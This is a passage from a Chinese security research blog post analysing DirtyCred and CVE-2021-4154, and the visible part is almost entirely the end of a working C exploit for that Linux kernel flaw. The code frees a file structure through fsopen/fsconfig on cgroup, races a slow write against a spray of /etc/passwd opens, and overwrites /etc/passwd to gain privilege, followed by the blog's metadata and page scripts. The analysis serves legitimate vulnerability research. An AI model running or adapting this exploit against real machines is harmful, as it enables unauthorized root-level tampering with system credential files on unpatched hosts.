*fmt, ...)</span> &#123;<br>  va_list params;<br><br>  va_start(params, fmt);<br>  <span class="hljs-built_in">vfprintf</span>(<span class="hljs-built_in">stderr</span>, fmt, params);<br>  va_end(params);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">use_temporary_dir</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  system(<span class="hljs-string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);<br>  <span class="hljs-type">char</span> *tmpdir = <span class="hljs-string">&quot;exp_dir&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!tmpdir)<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (chmod(tmpdir, <span class="hljs-number">0777</span>))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (chdir(tmpdir))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">write_file</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *what, ...)</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>  va_list args;<br>  va_start(args, what);<br>  vsnprintf(buf, <span class="hljs-keyword">sizeof</span>(buf), what, args);<br>  va_end(args);<br>  buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(buf);<br>  <span class="hljs-type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);<br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (write(fd, buf, len) != len) &#123;<br>    <span class="hljs-type">int</span> err = errno;<br>    close(fd);<br>    errno = err;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  close(fd);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_common</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">if</span> (mount(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="hljs-string">&quot;fusectl&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sandbox_common</span><span class="hljs-params">()</span> &#123;<br>  prctl(PR_SET_PDEATHSIG, SIGKILL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  setsid();<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">rlim</span>;</span><br>  rlim.rlim_cur = rlim.rlim_max = (<span class="hljs-number">200</span> &lt;&lt; <span class="hljs-number">20</span>);<br>  setrlimit(RLIMIT_AS, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">32</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_MEMLOCK, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">136</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_FSIZE, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_STACK, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">0</span>;<br>  setrlimit(RLIMIT_CORE, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">256</span>;<br>  setrlimit(RLIMIT_NOFILE, &amp;rlim);<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (mount(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-literal">NULL</span>, MS_REC | MS_PRIVATE, <span class="hljs-literal">NULL</span>)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWIPC)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(<span class="hljs-number">0x02000000</span>)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUTS)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_SYSVSEM)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *value;<br>  &#125; <span class="hljs-type">sysctl_t</span>;<br>  <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">sysctl_t</span> sysctls[] = &#123;<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmmax&quot;</span>, <span class="hljs-string">&quot;16777216&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmall&quot;</span>, <span class="hljs-string">&quot;536870912&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmmni&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmax&quot;</span>, <span class="hljs-string">&quot;8192&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmni&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmnb&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/sem&quot;</span>, <span class="hljs-string">&quot;1024 1048576 500 1024&quot;</span>&#125;,<br>  &#125;;<br>  <span class="hljs-type">unsigned</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(sysctls) / <span class="hljs-keyword">sizeof</span>(sysctls[<span class="hljs-number">0</span>]); i++)<br>    write_file(sysctls[i].name, sysctls[i].value);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wait_for_loop</span><span class="hljs-params">(<span class="hljs-type">int</span> pid)</span> &#123;<br>  <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (waitpid(<span class="hljs-number">-1</span>, &amp;status, __WALL) != pid) &#123;<br>  &#125;<br>  <span class="hljs-keyword">return</span> WEXITSTATUS(status);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">drop_caps</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">user_cap_header_struct</span> <span class="hljs-title">cap_hdr</span> =</span> &#123;&#125;;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">user_cap_data_struct</span> <span class="hljs-title">cap_data</span>[2] =</span> &#123;&#125;;<br>  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;<br>  cap_hdr.pid = getpid();<br>  <span class="hljs-keyword">if</span> (syscall(SYS_capget, &amp;cap_hdr, &amp;cap_data))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> drop = (<span class="hljs-number">1</span> &lt;&lt; CAP_SYS_PTRACE) | (<span class="hljs-number">1</span> &lt;&lt; CAP_SYS_NICE);<br>  cap_data[<span class="hljs-number">0</span>].effective &amp;= ~drop;<br>  cap_data[<span class="hljs-number">0</span>].permitted &amp;= ~drop;<br>  cap_data[<span class="hljs-number">0</span>].inheritable &amp;= ~drop;<br>  <span class="hljs-keyword">if</span> (syscall(SYS_capset, &amp;cap_hdr, &amp;cap_data))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> real_uid;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> real_gid;<br>__attribute__((aligned(<span class="hljs-number">64</span> &lt;&lt; <span class="hljs-number">10</span>))) <span class="hljs-type">static</span> <span class="hljs-type">char</span> sandbox_stack[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">namespace_sandbox_proc</span><span class="hljs-params">()</span> &#123;<br>  sandbox_common();<br>  loop();<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sandbox_namespace</span><span class="hljs-params">()</span> &#123;<br>  setup_common();<br>  real_uid = getuid();<br>  real_gid = getgid();<br>  mprotect(sandbox_stack, <span class="hljs-number">4096</span>, PROT_NONE);<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> pid =<br>        clone(namespace_sandbox_proc, &amp;sandbox_stack[<span class="hljs-keyword">sizeof</span>(sandbox_stack) - <span class="hljs-number">64</span>],<br>              CLONE_NEWUSER | CLONE_NEWPID, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> ret_status = wait_for_loop(pid);<br>    <span class="hljs-keyword">if</span> (ret_status == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] succeed\n&quot;</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] checking /etc/passwd\n\n&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] executing command : head -n 5 /etc/passwd\n&quot;</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      system(<span class="hljs-string">&quot;head -n 5 /etc/passwd&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to write, retry...\n\n&quot;</span>);<br>      sleep(<span class="hljs-number">3</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ===========================</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_NUM 1000</span><br><span class="hljs-type">int</span> uaf_fd;<br><span class="hljs-type">int</span> fds[MAX_FILE_NUM];<br><br><span class="hljs-type">int</span> run_write = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> run_spray = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> *cwd;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">slow_write</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start slow write to get the lock\n&quot;</span>);<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;./uaf&quot;</span>, <span class="hljs-number">1</span>);<br><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;error open uaf file&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> addr = <span class="hljs-number">0x30000000</span>;<br>  <span class="hljs-type">int</span> offset;<br>  <span class="hljs-keyword">for</span> (offset = <span class="hljs-number">0</span>; offset &lt; <span class="hljs-number">0x80000</span>; offset++) &#123;<br>    <span class="hljs-type">void</span> *r = mmap((<span class="hljs-type">void</span> *)(addr + offset * <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>,<br>                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);<br>    &#125;<br>  &#125;<br><br>  assert(offset &gt; <span class="hljs-number">0</span>);<br><br>  <span class="hljs-type">void</span> *mem = (<span class="hljs-type">void</span> *)(addr);<br>  <span class="hljs-built_in">memcpy</span>(mem, <span class="hljs-string">&quot;hhhhh&quot;</span>, <span class="hljs-number">5</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[5];</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    iov[i].iov_base = mem;<br>    iov[i].iov_len = (offset - <span class="hljs-number">1</span>) * <span class="hljs-number">0x1000</span>;<br>  &#125;<br><br>  run_write = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (writev(fd, iov, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;slow write&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write done!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">write_cmd</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> data[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;\nDirtyCred works!\n\n&quot;</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123;.iov_base = data, .iov_len = <span class="hljs-built_in">strlen</span>(data)&#125;;<br><br>  <span class="hljs-keyword">while</span> (!run_write) &#123;<br>  &#125;<br>  run_spray = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (writev(uaf_fd, &amp;iov, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to write\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] overwrite done! It should be after the slow write\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_files</span><span class="hljs-params">()</span> &#123;<br><br>  <span class="hljs-keyword">while</span> (!run_spray) &#123;<br>  &#125;<br>  <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] got uaf fd %d, start spray....\n&quot;</span>, uaf_fd);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_FILE_NUM; i++) &#123;<br>    fds[i] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fds[i] &lt; <span class="hljs-number">0</span>) &#123;<br>      perror(<span class="hljs-string">&quot;open file&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br>        <span class="hljs-number">0</span>) &#123;<br>      found = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] found, file id %d\n&quot;</span>, i);<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>        close(fds[j]);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (found) &#123;<br>    sleep(<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> fs_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;fsopen&quot;</span>);<br>    die(<span class="hljs-string">&quot;&quot;</span>);<br>  &#125;<br><br>  symlink(<span class="hljs-string">&quot;./data&quot;</span>, <span class="hljs-string">&quot;./uaf&quot;</span>);<br><br>  uaf_fd = open(<span class="hljs-string">&quot;./uaf&quot;</span>, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (uaf_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    die(<span class="hljs-string">&quot;failed to open symbolic file\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (syscall(__NR_fsconfig, fs_fd, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-number">0</span>, uaf_fd)) &#123;<br>    perror(<span class="hljs-string">&quot;fsconfig&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-comment">// free the uaf fd</span><br>  close(fs_fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span> &#123;<br>  trigger();<br><br>  <span class="hljs-type">pthread_t</span> p_id;<br>  pthread_create(&amp;p_id, <span class="hljs-literal">NULL</span>, slow_write, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">pthread_t</span> p_id_cmd;<br>  pthread_create(&amp;p_id_cmd, <span class="hljs-literal">NULL</span>, write_cmd, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-built_in">exit</span>(spray_files());<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  cwd = get_current_dir_name();<br>  syscall(__NR_mmap, <span class="hljs-number">0x1ffff000u</span>l, <span class="hljs-number">0x1000u</span>l, <span class="hljs-number">0ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  syscall(__NR_mmap, <span class="hljs-number">0x20000000u</span>l, <span class="hljs-number">0x1000000u</span>l, <span class="hljs-number">7ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  syscall(__NR_mmap, <span class="hljs-number">0x21000000u</span>l, <span class="hljs-number">0x1000u</span>l, <span class="hljs-number">0ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  use_temporary_dir();<br>  do_sandbox_namespace();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/Security-Research/" class="category-chain-item">Security Research</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/System-Security/" class="print-no-link">#System Security</a> <a href="/tags/linux/" class="print-no-link">#linux</a> <a href="/tags/DirtyCred/" class="print-no-link">#DirtyCred</a> <a href="/tags/Kernel/" class="print-no-link">#Kernel</a> <a href="/tags/CVE/" class="print-no-link">#CVE</a></div></div><div class="license-box my-3"><div class="license-title"><div>DirtyCred与CVE-2021-4154漏洞分析</div><div>https://mundi-xu.github.io/2022/10/08/DirtyCred/</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>煊宇</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>October 8, 2022</div></div><div class="license-meta-item"><div>Licensed under</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-cc-by"></i> </span></a><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="NC - Non-commercial"><i class="iconfont icon-cc-nc"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2023/07/26/Security-Risk-Analysis-of-Huawei-Mindspore/" title="MindSpore风险剖析与测试指南"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">MindSpore风险剖析与测试指南</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/2021/11/30/Architectural-Support-for-System-Security/" title="Architectural Support for System Security"><span class="hidden-mobile">Architectural Support for System Security</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments"><div id="giscus" class="giscus"></div><script type="text/javascript">Fluid.utils.loadComments('#giscus', function() {
        var options = {"repo":"Mundi-Xu/mundi-xu.github.io","repo-id":"MDEwOlJlcG9zaXRvcnkxNTQ1OTg4Mjg=","category":"Announcements","category-id":"DIC_kwDOCTb9rM4CeUGi","theme-light":"light","theme-dark":"dark","mapping":"title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN","strict":0};
        var attributes = {};
        for (let option in options) {
          if (!option.startsWith('theme-')) {
            var key = option.startsWith('data-') ? option : 'data-' + option;
            attributes[key] = options[option];
          }
        }
        var light = 'light';
        var dark = 'dark';
        window.GiscusThemeLight = light;
        window.GiscusThemeDark = dark;
        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
        for (let attribute in attributes) {
          var value = attributes[attribute];
          if (value === undefined || value === null || value === '') {
            delete attributes[attribute];
          }
        }
        var s = document.createElement('script');
        s.setAttribute('src', 'https://giscus.app/client.js');
        s.setAttribute('crossorigin', 'anonymous');
        for (let attribute in attributes) {
          s.setAttribute(attribute, attributes[attribute]);
        }
        var ss = document.getElementsByTagName('script');
        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
        e.parentNode.insertBefore(s, e.nextSibling);
      });</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>Contact me</span></a> <i class="iconfont icon-love"></i> <a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>mundi.xu@gmail.com</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.1.0/typed.umd.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>var relativeDate=function(){var t,e,a,d,i=document.getElementById("updated-time");i&&(e=/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/,(a=(t=i.textContent).match(e))&&(d=dayjs(a[0]).fromNow(),i.textContent=t.replace(e,d)),i.style.display="")};Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/dayjs.min.js",function(){Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/plugin/relativeTime.min.js",function(){dayjs.extend(dayjs_plugin_relativeTime),"en".startsWith("en")?relativeDate():Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/locale/en.min.js",function(){dayjs.locale("en"),relativeDate()})})})</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://cdnjs.cloudflare.com/ajax/libs/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/DynamicLine.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>